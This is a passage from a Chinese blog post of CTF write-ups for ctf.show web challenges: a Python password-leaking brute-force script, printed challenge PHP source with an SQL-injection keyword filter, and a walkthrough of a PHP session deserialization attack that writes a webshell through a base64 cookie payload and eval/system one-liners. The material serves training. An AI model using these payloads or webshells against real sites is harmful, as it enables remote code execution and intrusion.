class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#author 羽</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">&quot;https://fa8f49b7-5fc6-4dcb-97a1-b0e842429a9b.chall.ctf.show&quot;</span></span><br><span class="line">url1=url+<span class="string">&quot;/reg.php&quot;</span> <span class="comment">#注册页面</span></span><br><span class="line">url2=url+<span class="string">&quot;/login.php&quot;</span><span class="comment">#登录界面</span></span><br><span class="line">url3=url+<span class="string">&quot;/user_main.php?order=pwd&quot;</span> <span class="comment">#查询界面</span></span><br><span class="line">k=<span class="string">&quot;&quot;</span></span><br><span class="line">s=<span class="string">&quot;-.0123456789:abcdefghijklmnopqrstuvwxyz&#123;|&#125;~&quot;</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">45</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;*&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">        <span class="comment">#print(i)</span></span><br><span class="line">        l=<span class="string">&quot;&quot;</span></span><br><span class="line">        l=k+i</span><br><span class="line">        l2 = k+<span class="built_in">chr</span>(<span class="built_in">ord</span>(i)-<span class="number">1</span>)</span><br><span class="line">        data=&#123;<span class="string">&#x27;username&#x27;</span>:l,</span><br><span class="line">                    <span class="string">&#x27;email&#x27;</span>:<span class="string">&#x27;c&#x27;</span>,</span><br><span class="line">                    <span class="string">&#x27;nickname&#x27;</span>:<span class="string">&#x27;c&#x27;</span>,</span><br><span class="line">                    <span class="string">&#x27;password&#x27;</span>:l</span><br><span class="line">        &#125;</span><br><span class="line">        data2=&#123;<span class="string">&#x27;username&#x27;</span>:l,</span><br><span class="line">                      <span class="string">&#x27;password&#x27;</span>:l</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (l==<span class="string">&#x27;flag&#x27;</span>):</span><br><span class="line">            k=<span class="string">&#x27;flag&#x27;</span></span><br><span class="line">            <span class="built_in">print</span>(k)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        session = requests.session()</span><br><span class="line">        r1 = session.post(url1,data)</span><br><span class="line">        r2 = session.post(url2,data)</span><br><span class="line">        r3 = session.get(url3)</span><br><span class="line">        t = r3.text</span><br><span class="line">        <span class="comment">#print(l)</span></span><br><span class="line">        <span class="keyword">if</span> (t.index(<span class="string">&quot;&lt;td&gt;&quot;</span>+l+<span class="string">&quot;&lt;/td&gt;&quot;</span>)&gt;t.index(<span class="string">&quot;&lt;td&gt;flag@ctf.show&lt;/td&gt;&quot;</span>)):</span><br><span class="line">            k=l2</span><br><span class="line">            <span class="built_in">print</span>(k)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">         </span><br></pre></td></tr></table></figure>

<p>关于s中的字符是怎么来的这里做下解释：<br>动态的flag一般是 flag{1abc-aaa}这种，花括号中的值为小写字母+数字+”-“的组合，那么其他的字符又是为什么添加进来呢，这是因为我写的脚本是注册的用户出现在flag用户的下面时，获得他的上一个字符串。比如第一个字符为-，那当我们注册的密码为点号(.)时才能判断，所以需要加上点号(.)，其他的同理。</p>
<p>特殊说明一下：<br>因为存在flag用户所以当我们注册的用户名为flag，密码为flag时，可以注册成功，但是无法用我们注册的密码登录。所以中间加了个判断。</p>
<h2 id="一切看起来都那么合情合理"><a href="#一切看起来都那么合情合理" class="headerlink" title="一切看起来都那么合情合理"></a>一切看起来都那么合情合理</h2><p><a target="_blank" rel="noopener" href="http://www.zip/">www.zip</a> 下载源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">index.php</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">	session_start();</span><br><span class="line">	<span class="comment">//超过5次禁止登陆</span></span><br><span class="line">	<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;limit&#x27;</span>]))&#123;</span><br><span class="line">		<span class="variable">$_SESSION</span>[<span class="string">&#x27;limti&#x27;</span>]&gt;<span class="number">5</span>?<span class="keyword">die</span>(<span class="string">&quot;登陆失败次数超过限制&quot;</span>):<span class="variable">$_SESSION</span>[<span class="string">&#x27;limit&#x27;</span>]=base64_decode(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;limit&#x27;</span>]);</span><br><span class="line">		<span class="variable">$_COOKIE</span>[<span class="string">&#x27;limit&#x27;</span>] = base64_encode(base64_decode(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;limit&#x27;</span>]) +<span class="number">1</span>);</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		 setcookie(<span class="string">&quot;limit&quot;</span>,base64_encode(<span class="string">&#x27;1&#x27;</span>));</span><br><span class="line">		 <span class="variable">$_SESSION</span>[<span class="string">&#x27;limit&#x27;</span>]= <span class="number">1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">   <span class="variable">$_SESSION</span>[<span class="string">&#x27;limti&#x27;</span>]，所以只执行后面</span><br><span class="line">    session赋值为cookie的base64解码</span><br><span class="line">    下面是cookie的变化，没用</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">check.php</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&#x27;inc/inc.php&#x27;</span>;</span><br><span class="line"><span class="variable">$GET</span> = <span class="keyword">array</span>(<span class="string">&quot;u&quot;</span>=&gt;<span class="variable">$_GET</span>[<span class="string">&#x27;u&#x27;</span>],<span class="string">&quot;pass&quot;</span>=&gt;<span class="variable">$_GET</span>[<span class="string">&#x27;pass&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$GET</span>)&#123;</span><br><span class="line"></span><br><span class="line">	<span class="variable">$data</span>= <span class="variable">$db</span>-&gt;get(<span class="string">&#x27;admin&#x27;</span>,</span><br><span class="line">	[	<span class="string">&#x27;id&#x27;</span>,</span><br><span class="line">		<span class="string">&#x27;UserName0&#x27;</span></span><br><span class="line">	],[</span><br><span class="line">		<span class="string">&quot;AND&quot;</span>=&gt;[</span><br><span class="line">		<span class="string">&quot;UserName0[=]&quot;</span>=&gt;<span class="variable">$GET</span>[<span class="string">&#x27;u&#x27;</span>],</span><br><span class="line">		<span class="string">&quot;PassWord1[=]&quot;</span>=&gt;<span class="variable">$GET</span>[<span class="string">&#x27;pass&#x27;</span>] <span class="comment">//密码必须为128位大小写字母+数字+特殊符号，防止爆破</span></span><br><span class="line">		]</span><br><span class="line">	]);</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$data</span>[<span class="string">&#x27;id&#x27;</span>])&#123;</span><br><span class="line">		<span class="comment">//登陆成功取消次数累计</span></span><br><span class="line">		<span class="variable">$_SESSION</span>[<span class="string">&#x27;limit&#x27;</span>]= <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">echo</span> json_encode(<span class="keyword">array</span>(<span class="string">&quot;success&quot;</span>,<span class="string">&quot;msg&quot;</span>=&gt;<span class="string">&quot;欢迎您&quot;</span>.<span class="variable">$data</span>[<span class="string">&#x27;UserName0&#x27;</span>]));</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="comment">//登陆失败累计次数加1</span></span><br><span class="line">		<span class="variable">$_COOKIE</span>[<span class="string">&#x27;limit&#x27;</span>] = base64_encode(base64_decode(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;limit&#x27;</span>])+<span class="number">1</span>);</span><br><span class="line">		<span class="keyword">echo</span> json_encode(<span class="keyword">array</span>(<span class="string">&quot;error&quot;</span>,<span class="string">&quot;msg&quot;</span>=&gt;<span class="string">&quot;登陆失败&quot;</span>));</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>包含了inc.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">inc.php</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">ini_set(<span class="string">&#x27;display_errors&#x27;</span>, <span class="number">0</span>);</span><br><span class="line">ini_set(<span class="string">&#x27;session.serialize_handler&#x27;</span>, <span class="string">&#x27;php&#x27;</span>);</span><br><span class="line">date_default_timezone_set(<span class="string">&quot;Asia/Shanghai&quot;</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">use</span> \<span class="title">CTFSHOW</span>\<span class="title">CTFSHOW</span>; </span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&#x27;CTFSHOW.php&#x27;</span>;</span><br><span class="line"><span class="variable">$db</span> = <span class="keyword">new</span> CTFSHOW([</span><br><span class="line">    <span class="string">&#x27;database_type&#x27;</span> =&gt; <span class="string">&#x27;mysql&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;database_name&#x27;</span> =&gt; <span class="string">&#x27;web&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;server&#x27;</span> =&gt; <span class="string">&#x27;localhost&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;username&#x27;</span> =&gt; <span class="string">&#x27;root&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;password&#x27;</span> =&gt; <span class="string">&#x27;root&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;charset&#x27;</span> =&gt; <span class="string">&#x27;utf8&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;port&#x27;</span> =&gt; <span class="number">3306</span>,</span><br><span class="line">    <span class="string">&#x27;prefix&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;option&#x27;</span> =&gt; [</span><br><span class="line">        PDO::ATTR_CASE =&gt; PDO::CASE_NATURAL</span><br><span class="line">    ]</span><br><span class="line">]);</span><br><span class="line"></span><br><span class="line"><span class="comment">// sql注入检查</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkForm</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$str</span>))&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> preg_match(<span class="string">&quot;/select|update|drop|union|and|or|ascii|if|sys|substr|sleep|from|where|0x|hex|bin|char|file|ord|limit|by|\`|\~|\!|\@|\#|\\$|\%|\^|\\|\&amp;|\*|\(|\)|\（|\）|\+|\=|\[|\]|\;|\:|\&#x27;|\&quot;|\&lt;|\,|\&gt;|\?/i&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$status</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>,<span class="variable">$password</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">setStatus</span>(<span class="params"><span class="variable">$s</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;status=<span class="variable">$s</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        file_put_contents(<span class="string">&quot;log-&quot;</span>.<span class="keyword">$this</span>-&gt;username, <span class="string">&quot;使用&quot;</span>.<span class="keyword">$this</span>-&gt;password.<span class="string">&quot;登陆&quot;</span>.(<span class="keyword">$this</span>-&gt;status?<span class="string">&quot;成功&quot;</span>:<span class="string">&quot;失败&quot;</span>).<span class="string">&quot;----&quot;</span>.date_create()-&gt;format(<span class="string">&#x27;Y-m-d H:i:s&#x27;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*生成唯一标志</span></span><br><span class="line"><span class="comment">*标准的UUID格式为：xxxxxxxx-xxxx-xxxx-xxxxxx-xxxxxxxxxx(8-4-4-4-12)</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span>  <span class="title">uuid</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function"></span>&#123;  </span><br><span class="line">    <span class="variable">$chars</span> = md5(uniqid(mt_rand(), <span class="literal">true</span>));  </span><br><span class="line">    <span class="variable">$uuid</span> = substr ( <span class="variable">$chars</span>, <span class="number">0</span>, <span class="number">8</span> ) . <span class="string">&#x27;-&#x27;</span></span><br><span class="line">            . substr ( <span class="variable">$chars</span>, <span class="number">8</span>, <span class="number">4</span> ) . <span class="string">&#x27;-&#x27;</span> </span><br><span class="line">            . substr ( <span class="variable">$chars</span>, <span class="number">12</span>, <span class="number">4</span> ) . <span class="string">&#x27;-&#x27;</span></span><br><span class="line">            . substr ( <span class="variable">$chars</span>, <span class="number">16</span>, <span class="number">4</span> ) . <span class="string">&#x27;-&#x27;</span></span><br><span class="line">            . substr ( <span class="variable">$chars</span>, <span class="number">20</span>, <span class="number">12</span> );  </span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$uuid</span> ;  </span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure>

<p>ini_set(‘session.serialize_handler’, ‘php’);说明原来是php_serialize</p>
<p>漏洞利用点</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">inc.php里面重要的代码</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$status</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>,<span class="variable">$password</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">setStatus</span>(<span class="params"><span class="variable">$s</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;status=<span class="variable">$s</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        file_put_contents(<span class="string">&quot;log-&quot;</span>.<span class="keyword">$this</span>-&gt;username, <span class="string">&quot;使用&quot;</span>.<span class="keyword">$this</span>-&gt;password.<span class="string">&quot;登陆&quot;</span>.(<span class="keyword">$this</span>-&gt;status?<span class="string">&quot;成功&quot;</span>:<span class="string">&quot;失败&quot;</span>).<span class="string">&quot;----&quot;</span>.date_create()-&gt;format(<span class="string">&#x27;Y-m-d H:i:s&#x27;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>现在我们就要利用session进行序列化执行User类的file_put_contents()函数写入一句话，得到fla</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">在index.php里面开启了session回话，并且这里的<span class="variable">$_SESSION</span>的值我们可以控制</span><br><span class="line">我们就可以通过<span class="variable">$_SESSION</span>的值传递我们的payload入服务器的<span class="regexp">/tmp/</span>sess_xxx生成我们构造的序列化payload</span><br></pre></td></tr></table></figure>

<p>check.php里面最重要的就是require_once ‘inc/inc.php’，我们就可以访问check.php进行执行我们构造好的payload<br>因为该文件包含了inc.php文件，而inc.php文件里面会根据ini_set(‘session.serialize_handler’, ‘php’);的设置去读取/tmp/sess_xxxx文件里面的内容并且进行反序列化，执行file_put_contents()函数。</p>
<p>可以利用index.php里面的session_start()设置,控制$_SESSION的值（也就是limit）写入我们的payload到服务器的/tmp/sess_xxxx，然后利用inc.php里面的ini_set(‘session.serialize_handler’, ‘php’)设置去反序列化服务器上的/tmp/sess_xxxx文件，从而执行inc.php里面User类的file_put_contents()函数写入一句话</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$status</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>,<span class="variable">$password</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">setStatus</span>(<span class="params"><span class="variable">$s</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;status=<span class="variable">$s</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> User(<span class="string">&quot;1.php&quot;</span>,<span class="string">&quot;&lt;?php system(&#x27;cat fla*&#x27;);?&gt;&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> base64_encode(<span class="string">&quot;|&quot;</span>.serialize(<span class="variable">$a</span>));</span><br><span class="line"></span><br><span class="line">fE86NDoiVXNlciI6Mzp7czo4OiJ1c2VybmFtZSI7czo1OiIxLnBocCI7czo4OiJwYXNzd29yZCI7czoyNjoiPD9waHAgc3lzdGVtKCd0YWMgZmwqJyk7Pz4iO3M6Njoic3RhdHVzIjtOO30=</span><br></pre></td></tr></table></figure>

<p>具体实操：</p>
<p>先访问index.php,修改limit的cookie为</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fE86NDoiVXNlciI6Mzp7czo4OiJ1c2VybmFtZSI7czo1OiIxLnBocCI7czo4OiJwYXNzd29yZCI7czoyNjoiPD9waHAgc3lzdGVtKCd0YWMgZmwqJyk7Pz4iO3M6Njoic3RhdHVzIjtOO30=</span><br></pre></td></tr></table></figure>

<p><img src="/2022/03/31/CTF%E5%A4%A7%E8%B5%9B%E5%8E%9F%E9%A2%98/image-20220321211220453.png" alt="image-20220321211220453"></p>
<p>execute</p>
<p>写进去之后，这样session文件中就写入了我们需要的内容,访问check.php?u=123&amp;pass=123。因为包含了inc.php，inc.php中又改变了session引擎，进而反序列化出一个User类的实例，而这个实例在销毁的时候调用了<code>--destruct()</code>方法，进而达成了写shell的目的。</p>
<p>execute</p>
<p>最后访问log-1.php,成功rce</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">或者：</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$status</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>,<span class="variable">$password</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">setStatus</span>(<span class="params"><span class="variable">$s</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;status=<span class="variable">$s</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> User(<span class="string">&quot;1.php&quot;</span>,<span class="string">&#x27;&lt;?php eval($_POST[&quot;1&quot;]);?&gt;&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> base64_encode(<span class="string">&#x27;|&#x27;</span>.serialize(<span class="variable">$a</span>));</span><br><span class="line">post命令执行即可</span><br><span class="line"></span><br><span class="line">内置函数在<span class="keyword">eval</span>里面直接执行时不需要加分号</span><br><span class="line">    <span class="keyword">eval</span>(system(<span class="string">&#x27;ls&#x27;</span>))  或：</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&quot;system(&#x27;ls&#x27;);&quot;</span>)</span><br></pre></td></tr></table></figure>


    </div>

    
    
    

    <footer class="post-footer">
          <div class="post-tags">
              <a href="/tags/STUDY/" rel="tag"># STUDY</a>
          </div>

        

          <div class="post-nav">
            <div class="post-nav-item">
                <a href="/2022/03/29/JavaWeb/" rel="prev" title="JavaWeb">
                  <i class="fa fa-chevron-left"></i> JavaWeb
                </a>
            </div>
            <div class="post-nav-item">
                <a href="/2022/04/13/JAVA/" rel="next" title="JAVA">
                  JAVA <i class="fa fa-chevron-right"></i>
                </a>
            </div>
          </div>
    </footer>
  </article>
</div>






</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">


<div class="copyright">
  &copy; 
  <span itemprop="copyrightYear">2022</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">CJ</span>
</div>
<div class="wordcount">
  <span class="post-meta-item">
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-line"></i>
    </span>
    <span title="Symbols count total">492k</span>
  </span>
  <span class="post-meta-item">
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
    <span title="Reading time total">7:28</span>
  </span>
</div>
  <div class="powered-by">Powered by <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a>
  </div><script color="0,0,255" opacity="0.5" zIndex="-1" count="99" src="https://cdn.jsdelivr.net/npm/canvas-nest.js@1/dist/canvas-nest.js"></script>

    </div>
  </footer>

  
  <script src="https://cdn.jsdelivr.net/npm/animejs@3.2.1/lib/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script><script src="/js/bookmark.js"></script>

  





  





</body>
</html>
